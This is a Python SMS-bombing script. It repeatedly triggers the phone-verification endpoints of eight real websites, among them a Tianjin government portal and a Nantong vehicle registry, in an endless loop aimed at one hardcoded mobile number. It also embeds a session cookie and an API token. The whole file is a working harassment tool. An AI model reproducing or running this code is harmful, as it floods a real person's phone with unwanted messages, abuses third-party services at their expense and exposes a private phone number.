#!/user/bin/python
import requests
import sys
import time
import json
from PyQt5.QtCore import pyqtSignal,QThread


'''
class SMSsend_one(QThread):
    """数码之家短信接口"""
    log_output_sigl = pyqtSignal(str)
    def __init__(self, mobile,iteration):
        super(SMSsend_one,self).__init__(None)
        self.url = "http://bbs.mydigit.cn/registe.php"
        self.header = {
            "Referer": "http: // bbs.mydigit.cn / registe.php",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
        }
        self.mobile = mobile
        self.iteration = int(iteration)

    def get_response(self):
        data = {
            "action": "auth",
            "step": "1",
            "mobile": self.mobile
        }
        for i in range(0,self.iteration):
            try:
                response = requests.post(url=self.url,
                                         data=data,
                                         headers=self.header
                                         )
                # print(type(response.content.decode('utf-8')))
                self.log_output_sigl.emit(response.content.decode('utf-8'))
                # # print("{}:{}>>>发送成功".format(self.url, self.mobile))
                self.log_output_sigl.emit("{}:{}>>>发送成功".format(self.url, self.mobile))
                time.sleep(1)

            except:
                self.log_output_sigl.emit("{}:{}>>>发送失败".format(self.url, self.mobile))
                break
                


    def run(self):
        self.get_response()
        '''


class SMSsend_two(object):
    """世界经理人短信接口"""

    def __init__(self, mobile):
        self.url = "https://login.ceconline.com/thirdPartLogin.do"
        self.header = {
            "Referer": "https://login.ceconline.com/pcMobileNumberRegister.do",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
        }
        self.mobile = mobile

    def get_response(self):

        time_now = int(time.time() * 10)

        data = {
            "mobileNumber": self.mobile,
            "method": "getDynamicCode",
            "verifyType": "MOBILE_NUM_REG",
            "captcharType": "",
            "time": str(time_now)
        }

        try:
            response = requests.post(url=self.url,
                                     data=data,
                                     headers=self.header
                                     )
            print(response.content)
            print("{}:{}>>>发送成功".format(self.url, self.mobile))
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

    def run(self):
        self.get_response()


class SMSsend_three(object):
    """南通市机动车短信接口"""

    def __init__(self, mobile):
        self.url = "http://www.ntjxj.com/InternetWeb/SendYzmServlet"
        self.header = {
            "Referer": "http://www.ntjxj.com/InternetWeb/regHphmToTel.jsp",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
        }
        self.mobile = mobile

    def get_response(self):

        data = {
            "sjhm": self.mobile
        }

        try:
            response = requests.post(url=self.url,
                                     data=data,
                                     headers=self.header
                                     )
            print(response.content)
            print("{}:{}>>>发送成功".format(self.url, self.mobile))
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

    def run(self):
        self.get_response()


class SMSsend_four(object):
    """短信接口"""

    def __init__(self, mobile):
        self.url = "https://www.itjuzi.com/user/send_register_code"
        self.header = {
            "Referer": "https://www.itjuzi.com/user/register?redirect=search%3Fword%3DE%E5%AE%A0%E5%95%86%E5%9F%8E&flag=",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
        }
        self.mobile = mobile

    def get_response(self):
        time_now = int(time.time() * 10)

        data = {
            "mobile": self.mobile,
            "click_time": str(time_now),
            "token": "0641258293a4b7b014ff5750238072b0e390e9d2"
        }

        try:
            response = requests.post(url=self.url,
                                     data=data,
                                     headers=self.header
                                     )
            print(response.content)
            print("{}:{}>>>发送成功".format(self.url, self.mobile))
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

    def run(self):
        self.get_response()


class SMSsend_fine(object):
    """短信接口"""

    def __init__(self, mobile):
        self.url = "https://ems.xg-yc.com/ent/sendMobileCode"
        self.header = {
            "Referer": "https://ems.xg-yc.com/",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
            'Content - Type': 'application/json',
            'Cookie': 'JSESSIONID = 5D1E51B9C503FA37E84CBBFD0E90855F',
            'Host': 'ems.xg - yc.com',
            'Origin': 'https: // ems.xg - yc.com'
        }
        self.mobile = mobile

    def get_response(self):

        payload_data = {
            "mobile": self.mobile,
        }

        try:
            response = requests.post(url=self.url,
                                     data=json.dumps(payload_data),
                                     headers=self.header
                                     )
            print(response.content)
            print("{}:{}>>>发送成功".format(self.url, self.mobile))
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

    def run(self):
        self.get_response()


class SMSsend_six(object):
    """中央大厨房短信接口"""

    def __init__(self, mobile):
        self.url = "http://weixin.fresh300.com"
        self.header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
        }

        self.send_sms_url = "http://weixin.fresh300.com/services/Other/Register.ashx"
        self.mobile = mobile

    def get_response(self):
        response = requests.get(url=self.url, headers=self.header)
        new_url = response.url

        operate = 1
        qiege = new_url.split("=")
        OrganId = qiege[1].split("&")[0]
        BusinessId = qiege[2].split("&")[0]
        ShopId = qiege[3].split("&")[0]

        data = {
            'MobilePhone': self.mobile,
            'operate': operate,
            'OrganId': OrganId,
            'BusinessId': BusinessId,
            'ShopId': ShopId
        }

        self.header_send_sms = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
            'Referer': new_url
        }

        try:
            response = requests.post(url=self.send_sms_url,
                                     data=data,
                                     headers=self.header
                                     )
            print(response.content)
            print("{}:{}>>>发送成功".format(self.url, self.mobile))
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

    def run(self):
        self.get_response()


class SMSsend_seven(object):
    """易法通短信接口"""

    def __init__(self, mobile):
        self.url = "http://www.yifatong.com/Customers/getsms?rnd="
        self.header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
            'referer': 'http://www.yifatong.com/Customers/registration?url=p/zixun/',
            'X-Requested-With': 'XMLHttpRequest'
        }
        self.mobile = mobile

    def get_response(self):
        time_now = time.time()
        time_new = ("%0.3f" % time_now)

        url = self.url + time_new + "&mobile=" + self.mobile

        try:
            response = requests.get(url=url, headers=self.header)
            print(response.content)
            print("{}:{}>>>发送成功".format(self.url, self.mobile))
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

    def run(self):
        self.get_response()


class SMSsend_eight(object):
    """天津电子化商务短信接口"""

    def __init__(self, mobile):
        self.url = "http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login"
        self.header = {
            "Referer": "http://qydj.scjg.tj.gov.cn/reportOnlineService/",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
        }
        self.mobile = mobile

    def get_response(self):
        data = {
            'MOBILENO': self.mobile,
            'TEMP': 1
        }

        try:
            response = requests.post(url=self.url,
                                     data=data,
                                     headers=self.header
                                     )
            print(response.content)
            print("{}:{}>>>发送成功".format(self.url, self.mobile))
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

    def run(self):
        self.get_response()


if __name__ == "__main__":
    while 1:
        # mobile = ""
        mobile = "18873233265"  # 此处填写手机号即可
        # mobile = "12345678901"

        #one = SMSsend_one(mobile)
        two = SMSsend_two(mobile)
        three = SMSsend_three(mobile)
        four = SMSsend_four(mobile)
        five = SMSsend_fine(mobile)
        six = SMSsend_six(mobile)
        seven = SMSsend_seven(mobile)
        eight = SMSsend_eight(mobile)

        #one.run()
        two.run()
        three.run()
        four.run()
        five.run()
        six.run()
        seven.run()
        eight.run()

        time.sleep(1)
